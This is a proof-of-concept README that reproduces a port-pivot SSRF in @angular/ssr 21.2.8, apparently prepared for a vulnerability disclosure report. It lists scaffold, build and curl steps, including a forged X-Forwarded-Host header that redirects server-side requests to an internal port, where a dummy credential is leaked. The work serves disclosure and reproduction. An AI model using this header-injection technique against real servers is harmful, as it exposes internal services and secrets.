# PoC files

Minimal edits to a default `ng new --ssr` scaffold that reproduce the port-pivot SSRF in `@angular/ssr` 21.2.8.

## Files

- `app.ts` - replace `src/app/app.ts` in the scaffold
- `app.config.ts` - replace `src/app/app.config.ts`
- `app.routes.server.ts` - replace `src/app/app.routes.server.ts`
- `server.ts` - replace `src/server.ts`
- `angular.json.patch` - diff to apply to `angular.json`
- `victim.mjs` - listener on `127.0.0.1:13306` returning a dummy secret

## Scaffold and apply

Set `POC` to the directory holding these files (the extracted `poc/` directory).

```
export POC=/path/to/poc

cd /tmp
npx -y -p @angular/cli@21.2.8 ng new ssrf-test \
  --ssr --routing=true --style=css --skip-git --skip-install
cd ssrf-test
npm install

cp "$POC/app.ts"               src/app/app.ts
cp "$POC/app.config.ts"        src/app/app.config.ts
cp "$POC/app.routes.server.ts" src/app/app.routes.server.ts
cp "$POC/server.ts"            src/server.ts
patch angular.json < "$POC/angular.json.patch"
```

## Build and run

The PoC `server.ts` defaults to port 4200 when `PORT` is unset, so no env var is required.

```
npx ng build
node dist/ssrf-test/server/server.mjs &
node "$POC/victim.mjs" &
```

Wait a couple of seconds for both processes to come up. Verify with:

```
lsof -iTCP:4200 -iTCP:13306 -sTCP:LISTEN
```

## Reproduce

```
# A. Baseline. HttpClient fetches from its own origin, hits the local Express decoy.
curl -s http://127.0.0.1:4200/ | grep -oE 'API_[A-Z]+=[^<]*'
# Expected: API_RESPONSE=LOCAL_EXPRESS_ROUTE_SHOULD_NOT_BE_USED

# B. Exploit. X-Forwarded-Host with inline port redirects HttpClient to port 13306.
curl -s http://127.0.0.1:4200/ -H 'X-Forwarded-Host: 127.0.0.1:13306' \
  | grep -oE 'API_[A-Z]+=[^<]*'
# Expected: API_RESPONSE=INTERNAL_SECRET_CREDS=aws_key=AKIAXXXXXXXX

# C. Control. Off-allowlist hostname is rejected.
curl -s http://127.0.0.1:4200/ -H 'X-Forwarded-Host: evil.com:13306'
# Expected: 'URL with hostname "evil.com" is not allowed.'
```

See `../evidence/` for captured logs from a reference run and `../report/VRP_REPORT.md` for the full writeup.

## Cleanup

```
pkill -f 'dist/ssrf-test/server/server.mjs'
pkill -f 'poc/victim.mjs'
```
